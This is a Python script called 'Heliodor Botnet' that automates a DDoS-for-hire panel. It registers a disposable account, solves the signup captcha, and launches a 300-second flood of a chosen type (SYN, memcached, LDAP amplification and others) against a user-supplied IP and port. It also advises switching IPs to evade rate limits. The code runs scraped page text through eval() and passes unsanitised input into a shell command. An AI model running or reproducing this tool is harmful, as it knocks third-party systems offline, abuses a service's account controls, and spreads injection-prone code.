# Heliodor Botnet
# Made by chmvrek

# IMPORTS
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from requests_html import HTMLSession
from selenium import webdriver
from bs4 import BeautifulSoup
from os import system
import requests
import random
import string
import math
import os

# Color, Title, Size
system("title Heliodor - Waiting for DDOS")
system("color E")
system("mode 165, 55")

# Watermark
print(""" 
 __    __            __  __                  __                     
/  |  /  |          /  |/  |                /  |                    
$$ |  $$ |  ______  $$ |$$/   ______    ____$$ |  ______    ______  
$$ |__$$ | /      \ $$ |/  | /      \  /    $$ | /      \  /      \ 
$$    $$ |/$$$$$$  |$$ |$$ |/$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |
$$$$$$$$ |$$    $$ |$$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$/ 
$$ |  $$ |$$$$$$$$/ $$ |$$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |$$ |      
$$ |  $$ |$$       |$$ |$$ |$$    $$/ $$    $$ |$$    $$/ $$ |      
$$/   $$/  $$$$$$$/ $$/ $$/  $$$$$$/   $$$$$$$/  $$$$$$/  $$/       
                                                                     """)

# Inputs
print('> MADE BY CHMVREK <\n')

print('*Remember to change your IP to avoid rate-limit.*\n')

print('METHODS > UBNT, MDNS, MSSQL, BLUESYN, CHINADOS, SYN9, GREENSYN, TCP-AMP, MEMCACHED, PMS, ISAKMP, ACK, TFTP, DOMINATE, SSYN, LDAP, VSE, SNMP, NBS, UDP, ZUDP, SSDP')

method = input()

print(' \nIP > ')

ip = input()


print('\nPORT > ')

port = input()

print('')

# VARIABLES
options = webdriver.ChromeOptions();
options.add_argument('headless')
options.add_argument("disable-gpu")
options.add_argument('window-size=1920x1080')
options.add_argument("test-type")
options.add_argument("--no-sandbox");
options.add_argument("--incognito")
options.add_argument('--disable-logging') 
options.add_argument("--disable-crash-reporter");
options.add_argument("--disable-extensions");
options.add_argument("--disable-in-process-stack-traces");
options.add_argument("--disable-dev-shm-usage");
options.add_argument("--log-level=3");
options.add_argument("--output=/dev/null");
options.add_experimental_option("detach", True)
options.add_experimental_option('excludeSwitches', ['enable-logging'])
browser = webdriver.Chrome(options=options)


# POST REQUEST - CREATE ACCOUNT
system("title " + "Heliodor - DDOSing... - " + ip + " - " + method)
random = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10))
randomString = str(random)
browser.get("https://str3ssed.co/panel/register.php")
captchaString = str(browser.find_element(By.XPATH, '//label[@for="captcha"]').text).replace("What is ", "").replace("?", "")
browser.find_element(By.NAME, "username").send_keys(randomString)
browser.find_element(By.NAME, "email").send_keys(randomString + "@google.dog")
browser.find_element(By.NAME, "password").send_keys(randomString + '1234')
browser.find_element(By.NAME, "cpassword").send_keys(randomString + '1234')
browser.find_element(By.NAME, "captcha").send_keys(eval(captchaString))
browser.find_element(By.NAME, 'agree').send_keys(Keys.SPACE)
browser.find_element(By.NAME, 'register').click()

print('Username > ' + randomString)
print('Password > ' + randomString + '1234')
print('Captcha > ' + str(eval(captchaString)) + '\n')

# POST REQUEST - SEND ATTACK
browser.get("https://str3ssed.co/panel/hub.php")
browser.find_element(By.NAME, "host").send_keys(ip)
browser.find_element(By.NAME, "time").send_keys("300")
browser.find_element(By.NAME, "port").send_keys(Keys.BACKSPACE + Keys.BACKSPACE + port)
Select(browser.find_element(By.NAME, 'method')).select_by_visible_text(method)
browser.find_element(By.NAME, "startstress").click()

print('> Done <')
print('300 seconds | ' + method + ' | Port 80 | HELIODOR.SPACE\n')
print('> Pinging 10 times... <')
os.system("start /wait cmd /c ping " + ip + " -n 10")
input("> Press enter to exit <")
